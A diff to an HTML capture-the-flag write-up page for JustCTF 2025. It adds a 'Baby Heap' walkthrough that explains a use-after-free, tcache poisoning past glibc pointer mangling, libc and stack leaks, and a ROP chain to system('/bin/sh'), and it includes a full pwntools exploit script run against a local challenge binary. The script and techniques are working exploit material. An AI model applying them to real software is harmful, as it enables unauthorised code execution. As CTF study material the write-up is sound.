@@ -39,7 +39,7 @@ JustCTF 2025</code></h1>
             </p>
         </div>
         <div class="section-content">
-            <h1>Format String Shenanigans</h1>
+            <h1>Fmt-String Shenanigans</h1>
             <img src="{{ '/writeups/JustCTF2025/assets/shellcodeprinter.png' | relative_url }}" alt="snippet" class="code-screenshot" />
             <p>
                 You’d expect this to be your average <code>printf</code>-style info leak, right?<br>
@@ -159,6 +159,259 @@ if __name__ == "__main__":
         </div>
     </div>
 </section>
+</section>
+
+
+<section id="back">
+  <section id="blueback" class="container">
+    <div id="babyheap" class="challenge-section">
+      <div class="section-content">
+        <b>Name:</b> <span class="text"> Baby Heap </span><br>
+        <b>Category:</b> Binary Exploitation<br>
+        <p><br>
+          This one looked simple at first glance — but, as usual, it wasn't going to let us off that easy.<br>
+          <br>
+          Opening the binary in IDA made the vulnerability jump right out — a <strong>Use-After-Free (UAF)</strong> in the <code>delete()</code> function.<br>
+          Why? Because the freed pointer isn’t nulled out afterward. Classic mistake.<br>
+          <br>
+          Sounds like tcache poisoning material.
+        </p>
+      </div>
+
+      <div class="section-content">
+        <h2>checksec? Oh boy.</h2>
+        <pre><code class="language-bash">RELRO:    Full RELRO  
+Canary:   Yes  
+NX:       Yes  
+PIE:      Yes  
+SHSTK:    Enabled  
+IBT:      Enabled</code></pre>
+        <p>
+          Yep. All the modern security goodies are turned on.<br>
+          So... no GOT overwrite. No return-to-plt. No partial overwrite shenanigans.<br>
+          <br>
+          And the binary allocates pretty small chunks — so we’re not even getting out of the tcache fastbin area.<br>
+          <strong>Leak required.</strong> No exceptions.
+        </p>
+      </div>
+
+      <div class="section-content">
+        <h2>Welcome to the House... of Something?</h2>
+        <p>
+          Now, we know there are heap exploitation techniques called “House of X” (<code>Lore</code>, <code>Force</code>, <code>Einherjar</code>, etc.).<br>
+          But honestly, I don’t even know what this one would be called.<br>
+          <br>
+          We’re going to:
+          <ul>
+            <li>Create a fake chunk</li>
+            <li>Force it into the <code>unsorted bin</code></li>
+            <li>Leak a libc pointer from the <code>main_arena</code> metadata</li>
+          </ul>
+          Why does that work?<br>
+          Because <code>ptmalloc</code> uses a doubly-linked list for unsorted bins, and the chunk's <code>fd</code> and <code>bk</code> pointers end up pointing directly inside <code>main_arena</code>.<br>
+          <strong>Beautiful.</strong>
+        </p>
+      </div>
+
+      <div class="section-content">
+        <h2>Gameplan</h2>
+        <h4>Step 1: Leak Heap Address + Tcache Key</h4>
+        <p>
+          Using the UAF, we read a freed chunk and get two things:
+          <ul>
+            <li><strong>Tcache key</strong> — used for pointer mangling (introduced in glibc 2.32+).</li>
+            <li><strong>Mangled pointer</strong> — XORing this with the key gives us a heap leak.</li>
+          </ul>
+        </p>
+
+        <h4>Step 2: Tcache Poisoning for Controlled Allocation</h4>
+        <p>
+          We poison the tcache freelist to get a pointer that overlaps with another chunk. This lets us:
+          <ul>
+            <li>Corrupt its metadata (e.g., the <code>size</code> field).</li>
+            <li>Create a fake chunk header with <code>size &gt; 0x408</code> → ensures it goes to the unsorted bin.</li>
+          </ul>
+          <br>
+          💡 <strong>Important glibc 2.39 checks:</strong>
+          <ul>
+            <li><code>prev_inuse</code> bit of the next chunk must be <code>1</code>, or you'll hit consolidation checks.</li>
+            <li>Next chunk’s <code>prev_size</code> and <code>size</code> fields must line up correctly.</li>
+            <li>If you corrupt a chunk’s size, make sure you don't accidentally mark it as <code>IS_MMAPPED</code> or you'll crash.</li>
+          </ul>
+          <img src="{{ '/writeups/JustCTF2025/assets/babyheap1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+        </p>
+
+        <h4>Step 3: Trigger Unsorted Bin Insertion</h4>
+        <p>
+          Now we free our overlapping (victim) chunk with the large fake size → it ends up in the <code>unsorted bin</code>.<br>
+          Its <code>fd</code>/<code>bk</code> now point to libc’s <code>main_arena</code>.<br>
+          <br>
+          <img src="{{ '/writeups/JustCTF2025/assets/babyheap.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+          Boom. <strong>Libc leak</strong>.<br>
+          From here, we can:
+          <ul>
+            <li>Compute libc base.</li>
+            <li>Poison tcache again — but this time to leak stack address via <code>__environ</code>.</li>
+          </ul>
+        </p>
+
+        <h4>Step 4: Final Tcache Poisoning – Stack Write</h4>
+        <p>
+          We tcache-poison again to get an allocation pointing directly to the saved return address on the stack.<br>
+          From here, we drop a ROP chain:
+          <ul>
+            <li><code>pop rdi</code></li>
+            <li><code>"/bin/sh"</code></li>
+            <li><code>ret</code> (alignment)</li>
+            <li><code>system</code></li>
+          </ul>
+          <br>
+          And that’s it — <strong>shell popped.</strong>
+        </p>
+      </div>
+      <div class="section-content">
+            <div class="h4-wrapper">
+                <h4>Exploit Script</h4>
+                <button class="copy-btn">Copy</button>
+            </div>
+<pre><code class="language-python">from pwn import *
+
+context.binary = exe = ELF('./babyheap_patched', checksec=False)
+libc = exe.libc
+context.log_level = "info"
+
+# XOR-based pointer mangling (tcache protection)
+def mangle(key, addr):
+    return key ^ addr
+
+# Allocate chunk
+def malloc(idx, data):
+    io.sendlineafter(b"> ", b'1')
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendafter(b"Data: ", data)
+
+# Free chunk
+def free(idx):
+    io.sendlineafter(b"> ", b'4')
+    io.sendlineafter(b"Index: ", str(idx).encode())
+
+# Read chunk content (8 bytes max expected)
+def read(idx):
+    io.sendlineafter(b"> ", b'2')
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    return io.recvline().strip().ljust(8, b"\x00")
+
+# Overwrite chunk content
+def write(idx, data):
+    io.sendlineafter(b"> ", b'3')
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendafter(b"Data: ", data)
+
+def exploit():
+    # Allocate and free chunks to set up leak
+    for i in range(2):
+        malloc(i, p64(0x11) * 6)
+    for i in range(2):
+        free(i)
+
+    # Leak tcache key and mangled pointer
+    key = u64(read(0))
+    mangled = u64(read(1))
+    heap_leak = mangled ^ key
+
+    log.success(f"KEY: {hex(key)}")
+    log.success(f"MANGLED PTR: {hex(mangled)}")
+    log.success(f"HEAP LEAK: {hex(heap_leak)}")
+
+    # Tcache poisoning: overwrite next pointer in tcache entry (index 1)
+    write(1, p64(mangle(key, heap_leak + 0x10)))
+
+    # Chunk 2 is dummy to align tcache
+    malloc(2, b"dummy")
+
+    # Chunk 3 returns previously poisoned tcache ptr (i.e., index 0 + 16)
+    malloc(3, b"victim")
+
+    # Overwrite size field of chunk 0 to 0x421 (fake large chunk)
+    write(0, p64(0) + p64(0x421))
+
+    # Allocate and free two more chunks to fill tcache bin for 0x420
+    for i in range(4, 6):
+        malloc(i, b"dummy")
+    for i in range(4, 6):
+        free(i)
+
+    # Overwrite next tcache pointer to chunk at heap + 0x420
+    target = heap_leak + 0x420
+    write(5, p64(mangle(key, target)))
+
+    # Reallocate from poisoned tcache bin
+    malloc(6, b"dummy")
+    malloc(7, p64(0) + p64(0x11)*5)
+
+    # Free chunk 3 (unsorted bin now) to leak libc via main_arena
+    free(3)
+    libc_leak = u64(read(3))
+    libc.address = libc_leak - 0x203b20
+    log.success(f"LIBC BASE: {hex(libc.address)}")
+
+    # Setup tcache poisoining to leak stack address via __environ
+    malloc(7, b'8')
+    malloc(8, b'9')
+    malloc(9, b'10')
+    free(8)
+    free(9)
+
+    write(9, p64(mangle(key, libc.sym.environ - 0x18)))  # prepare leak from environ
+    malloc(10, b'11')
+    malloc(11, b'A'*0x18)
+
+    io.sendlineafter(b"> ", b'2')
+    io.sendlineafter(b"Index: ", b'11')
+    io.recvuntil(b"A" * 0x18)
+    stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
+    log.success(f"STACK LEAK @ {hex(stack_leak)}")
+
+    # Now use tcache poisoning again to write ROP chain to stack
+    malloc(13, b'13')
+    malloc(14, b'14')
+    free(13)
+    free(14)
+
+    # Overwrite tcache next ptr to stack - 0x158 (controlled return address)
+    write(14, p64(mangle(key, stack_leak - 0x158)))
+    malloc(15, b'15') 
+
+    # ROP chain to system("/bin/sh")
+    rop = ROP(libc)
+    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+    ret = pop_rdi + 1
+    binsh = next(libc.search(b'/bin/sh\0'))
+
+     # overwrite saved rbp if needed
+    payload = flat(
+        0,             
+        pop_rdi, binsh,
+        ret,
+        libc.sym.system
+    )
+    malloc(16, payload)
+
+    # Pop shell
+    log.success("🚀 Launching shell...")
+    io.interactive()
+
+def main():
+    global io
+    io = process(exe.path)
+    input(f"[+] PID: {io.pid}")  # for attaching GDB manually
+    exploit()
+
+if __name__ == "__main__":
+    main()
+</div>
+    </div>
+  </section>
 </section>
 
 
